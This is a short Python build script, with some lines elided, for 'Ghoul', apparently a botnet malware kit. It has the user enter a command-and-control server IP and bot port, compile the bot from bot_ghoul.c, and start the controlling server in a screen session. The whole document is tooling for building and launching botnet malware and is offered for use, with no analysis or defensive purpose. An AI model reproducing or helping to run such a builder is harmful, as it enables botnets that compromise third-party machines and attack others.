#Ghoul All You Need To Do is Put The IP in the bot_ghoul.c and set your botport it can be what ever your want
import sys
import time
import subprocess
import warnings
...
print ("\x1b[38;5;93m[+] Welcome to \x1b[1;36mGhoul \x1b[38;5;93m[+]")
print ("\x1b[38;5;93m[+] Load All \x1b[1;36mGhoul \x1b[38;5;93mFiles Into \x1b[1;36m/root/")
print ("\x1b[38;5;93m[+] Change IP and botport in bot_ghoul.c")
raw_input ("\x1b[38;5;93m[+] When All Files Are Loaded, Press Enter to Start Building...")

print ("\r\n\x1b[38;5;93m       Ghoul - Auto-Build Process Initiated...\r\n")
time.sleep(2)

ip = raw_input("Enter Server IP:")
botport = raw_input("Enter Your Botport:") #make sure your bot port is the same as the one in the bot_ghoul.c
...
print ("\x1b[38;5;93m[+] Compiling Ghoul Bot...\x1b[0m")
time.sleep(2)

run("python Ghoul.py bot_ghoul.c " + ip + "")
...
raw_input("[+] If Nothing happens then just type screen ./server [botport] 1 [screen port]")
